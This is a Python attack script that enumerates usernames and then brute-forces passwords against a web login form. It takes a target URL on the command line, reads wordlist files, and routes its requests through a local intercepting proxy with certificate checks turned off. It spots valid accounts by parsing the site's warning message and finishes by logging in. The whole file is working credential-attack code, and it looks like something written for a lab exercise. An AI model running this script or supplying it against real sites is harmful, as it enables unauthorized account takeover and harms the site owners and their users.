import requests
import sys
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url=sys.argv[1]
password = sys.argv[2]

print(f"Target URL: {url}")
print(f"Password: {password}")
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Initialize session for maintaining cookies and session state
session = requests.Session()
def user_enemuration(url,password): 
# Open the usernames file and iterate through each username
    with open('usernames', 'r') as file:
        usernames = file.readlines()

# Strip any leading/trailing whitespace from usernames
    usernames = [username.strip() for username in usernames]

# Loop through each username
    for username in usernames:
        print(f"\nAttempting login with username: {username}")
    
    # Request the login page
        response = session.get(url, proxies=proxies, verify=False)
    
        if response.status_code != 200:
            print(f"Failed to retrieve the login page. Status code: {response.status_code}")
            continue
    
    # Set up headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }

    # Prepare login data
        login_data = {
        'username': username,
        'password': password
        }

    # Send POST request to login
        send = session.post(url, data=login_data, headers=headers, proxies=proxies, verify=False)
    
    # Check if login is successful
        soup = BeautifulSoup(send.text, 'html.parser')
        invalid_username_msg = soup.find('p', class_='is-warning')
    
    
        if "Invalid username or password" in invalid_username_msg:
            print(f"\nFailed to log in as: {username} (Invalid username)")
        else:
            print(f"Username found {username}")
            return username



# Password


def password_enemuration(url,username):
    with open('passwords', 'r') as file:
        password_list = file.readlines()

# Strip any leading/trailing whitespace from usernames
    password_list = [password.strip() for password in password_list]

# Loop through each username
    for password in password_list:
        print(f"\nAttempting login with username: {username}")
        print(f"\n Password is:{password}")
    
    # Request the login page
        response = session.get(url, proxies=proxies, verify=False)
    
        if response.status_code != 200:
            print(f"Failed to retrieve the login page. Status code: {response.status_code}")
            continue
    
    # Set up headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        }

    # Prepare login data
        login_data = {
        'username': username,
        'password': password
        }

    # Send POST request to login
        send = session.post(url, data=login_data, headers=headers, proxies=proxies, verify=False)
    
    # Check if login is successful
        soup = BeautifulSoup(send.text, 'html.parser')
        invalid_password_msg = soup.find('p', class_='is-warning')
    
        if "Invalid username or password " in invalid_password_msg:
            print(f"\nFailed to log in as: {password} (Invalid password)")
        else:
            print(f"password found {password}")
            return password

print("-----------------------------User Enemuration-------------------------------------")
valid_username=user_enemuration(url,password)
choice=input("Password Enemuration: Y/N:").upper()
if(choice=="Y"):
    print("\n--------------------------------Password Enemuration-------------------------")
    valid_password= password_enemuration(url,valid_username)
    login=session.post(url,data={valid_username,valid_password})
    print(login.text)
    

else:
    print(f"Valid Username is{valid_username}")
